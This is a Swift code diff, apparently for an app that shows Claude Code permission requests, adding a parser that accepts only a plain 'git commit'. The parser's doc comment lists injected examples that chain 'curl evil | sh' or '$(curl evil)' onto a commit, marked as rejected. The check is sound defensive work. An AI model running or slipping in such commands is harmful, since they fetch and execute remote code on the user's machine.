@@ -45,12 +45,23 @@ enum HookText {
         return tool
     }
 
-    /// Why the request is shown: the tool's own description, the payload's message, or what
-    /// "Always" would remember (from `permission_suggestions`).
+    /// Why the request is shown: the tool's own description, else the payload's message.
+    /// What "Always" would remember is `alwaysRules`, shown on its own lines.
     static func permissionReason(payload: JSONValue) -> String? {
         if let text = payload["tool_input"]?["description"]?.stringValue, !text.isEmpty { return text }
         if let text = payload["message"]?.stringValue, !text.isEmpty { return text }
-        guard let suggestion = payload["permission_suggestions"]?.arrayValue?.first else { return nil }
+        return nil
+    }
+
+    /// What "Always" would remember, one line per `permission_suggestions` entry. The reply
+    /// sends every entry back (SocketServer.replyLine), so the card must show every one.
+    static func alwaysRules(payload: JSONValue) -> [String] {
+        (payload["permission_suggestions"]?.arrayValue ?? []).map(suggestionText)
+    }
+
+    /// "Always allows Bash(npm test:*) for this session." An entry of a kind this app does
+    /// not know still gets a line: it is sent back all the same.
+    private static func suggestionText(_ suggestion: JSONValue) -> String {
         let destination: String? = {
             switch suggestion["destination"]?.stringValue {
             case "session": return "for this session"
@@ -63,23 +74,27 @@ enum HookText {
         var text: String?
         switch suggestion["type"]?.stringValue {
         case "setMode":
-            if suggestion["mode"]?.stringValue == "acceptEdits" { text = "Always accepts edits" }
-        case "addRules":
+            let mode = suggestion["mode"]?.stringValue ?? ""
+            text = mode == "acceptEdits" ? "Always accepts edits" : "Switches to \(mode) mode"
+        case "addRules", "replaceRules":
             let rules = suggestion["rules"]?.arrayValue ?? []
             let names = rules.compactMap { rule -> String? in
                 guard let tool = rule["toolName"]?.stringValue else { return nil }
                 if let content = rule["ruleContent"]?.stringValue, !content.isEmpty { return "\(tool)(\(content))" }
                 return tool
             }
-            if !names.isEmpty { text = "Always allows " + names.joined(separator: ", ") }
+            if !names.isEmpty {
+                let verb = suggestion["behavior"]?.stringValue == "deny" ? "Always denies " : "Always allows "
+                text = verb + names.joined(separator: ", ")
+            }
         case "addDirectories":
             let dirs = (suggestion["directories"]?.arrayValue ?? []).compactMap { $0.stringValue }
             if !dirs.isEmpty { text = "Always adds " + dirs.joined(separator: ", ") }
         default:
             break
         }
-        guard let text else { return nil }
-        return [text, destination].compactMap { $0 }.joined(separator: " ") + "."
+        let line = text ?? "Applies " + (suggestion["type"]?.stringValue ?? "a permission update")
+        return [line, destination].compactMap { $0 }.joined(separator: " ") + "."
     }
 
     /// The diff an Edit / Write / MultiEdit / NotebookEdit request would make, and the card title.
@@ -146,6 +161,105 @@ enum HookText {
         guard let first = message.split(separator: "\n").first else { return nil }
         let subject = first.trimmingCharacters(in: .whitespaces)
         return subject.isEmpty ? nil : subject
+    }
+
+    /// True for a plain `git commit` and nothing more, so the commit card, whose Commit
+    /// allows the whole command, can never approve a second command riding on it. The
+    /// message arguments are set aside first (`-m "…"`, `-m '…'`, `--message=…`, `-am "…"`,
+    /// and Claude Code's heredoc `-m "$(cat <<'EOF' … EOF\n)"`); a double-quoted message
+    /// may not hold `$` or a backtick, an unquoted heredoc neither. What is left must be words
+    /// of `[A-Za-z0-9_./=-]`: no `;`, `&&`, `||`, `|`, backtick, `$(`, `>`, `<` or newline.
+    ///
+    ///     git commit -m "Fix the peek"                           true
+    ///     git commit -m "$(cat <<'EOF'\nFix\n\nBody\nEOF\n)"     true
+    ///     git commit --amend --no-edit                           true
+    ///     git commit -m "x" && curl evil | sh                    false
+    ///     git commit -m "$(curl evil)"                           false
+    ///     git commit -m x > /tmp/log                             false
+    static func isPlainCommit(_ command: String) -> Bool {
+        let s = Array(command.trimmingCharacters(in: .whitespacesAndNewlines))
+        var i = 0
+        func blank(_ c: Character) -> Bool { c == " " || c == "\t" }
+        func skipBlanks() { while i < s.count, blank(s[i]) { i += 1 } }
+        func boundary() -> Bool { i >= s.count || blank(s[i]) }
+        func isWordChar(_ c: Character) -> Bool { c.isASCII && (c.isLetter || c.isNumber || "_./=-".contains(c)) }
+        func take(_ text: String) -> Bool {
+            let t = Array(text)
+            guard i + t.count <= s.count, Array(s[i..<i + t.count]) == t else { return false }
+            i += t.count
+            return true
+        }
+        func word() -> String {
+            let start = i
+            while i < s.count, isWordChar(s[i]) { i += 1 }
+            return String(s[start..<i])
+        }
+        // `"$(cat <<'EOF'` already taken: the body up to the marker line, then `)"`.
+        func heredoc() -> Bool {
+            let dash = take("-")
+            skipBlanks()
+            var quote: Character?
+            if i < s.count, s[i] == "'" || s[i] == "\"" { quote = s[i]; i += 1 }
+            let marker = word()
+            guard !marker.isEmpty else { return false }
+            if let quote { guard take(String(quote)) else { return false } }
+            skipBlanks()
+            guard take("\n") else { return false }
+            while true {
+                guard i < s.count else { return false }
+                var end = i
+                while end < s.count, s[end] != "\n" { end += 1 }
+                let line = s[i..<end]
+                i = min(end + 1, s.count)
+                if String(line) == marker || (dash && String(line.drop(while: { $0 == "\t" })) == marker) { break }
+                // An unquoted marker lets the shell expand the body.
+                if quote == nil, line.contains(where: { "$`\\".contains($0) }) { return false }
+            }
+            while i < s.count, blank(s[i]) || s[i] == "\n" { i += 1 }
+            return take(")\"")
+        }
+        // One message argument, taken only when the shell reads it as literal text.
+        func message() -> Bool {
+            guard i < s.count else { return false }
+            if take("\"$(cat <<") { return heredoc() && boundary() }
+            switch s[i] {
+            case "'":
+                i += 1
+                while i < s.count, s[i] != "'" { i += 1 }
+                guard take("'") else { return false }
+            case "\"":
+                i += 1
+                while i < s.count, s[i] != "\"" {
+                    if s[i] == "$" || s[i] == "`" { return false }
+                    i += s[i] == "\\" ? 2 : 1
+                }
+                guard take("\"") else { return false }
+            default:
+                guard !word().isEmpty else { return false }
+            }
+            return boundary()
+        }
+        func takesMessage(_ w: String) -> Bool {
+            if w == "-m" || w == "--message" || w == "--message=" { return true }
+            // A short-option cluster ending in m: `-am`.
+            return w.count > 2 && w.hasPrefix("-") && !w.hasPrefix("--") && w.hasSuffix("m")
+                && w.dropFirst().allSatisfy { $0.isASCII && $0.isLetter }
+        }
+
+        guard word() == "git", i < s.count, blank(s[i]) else { return false }
+        skipBlanks()
+        guard word() == "commit", boundary() else { return false }
+        while true {
+            skipBlanks()
+            if i >= s.count { return true }
+            let w = word()
+            if takesMessage(w) {
+                skipBlanks()
+                guard message() else { return false }
+                continue
+            }
+            guard !w.isEmpty, boundary() else { return false }
+        }
     }
 
     /// Counts added and removed lines in a Claude Code `structuredPatch`.
